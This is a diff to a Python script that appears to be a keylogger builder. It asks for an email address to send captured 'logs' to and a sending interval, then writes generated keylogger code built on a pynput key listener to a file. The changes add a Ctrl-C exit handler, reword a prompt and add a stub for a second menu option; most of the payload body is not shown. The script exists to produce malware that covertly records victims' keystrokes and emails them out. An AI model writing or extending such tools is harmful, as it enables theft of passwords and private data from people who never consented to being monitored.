@@ -1,6 +1,8 @@
 from colorama import Style, Fore, Back
 import os
 import subprocess
+import signal
+import sys
 
 print(Fore.CYAN + "   ▄▄▄▄███▄▄▄▄    ▄██████▄     ▄████████    ▄████████    ▄████████ ")
 print(Fore.CYAN + " ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███   ███    ███   ███    ███ ")
@@ -17,6 +19,13 @@ print(Fore.CYAN + "")
 print(Fore.CYAN + "")
 
 print(Style.RESET_ALL)
+
+
+
+def signal_handler(signal, frame):
+  sys.exit(0)
+
+signal.signal(signal.SIGINT, signal_handler)
 
 for i in range(3):
     print("")
@@ -49,7 +58,7 @@ while True:
         Style.RESET_ALL
         EmailTarget = input(Fore.YELLOW + "Enter the email you want to send the logs: " + Fore.CYAN)
         Style.RESET_ALL
-        SleepTime = input(Fore.YELLOW + "How much time to wait until sending new email: " + Fore.CYAN)
+        SleepTime = input(Fore.YELLOW + "How much time to wait until sending new email (Seconds Format): " + Fore.CYAN)
         Style.RESET_ALL
 
         KeyLoggerCode = fr'''
@@ -100,7 +109,11 @@ with Listener(on_press=on_press) as listener:
         f.write(KeyLoggerCode)
         f.close()
 
-    print()
+
+        print()
 
 
+    if Selection == "2":
+        print("")
+        
 
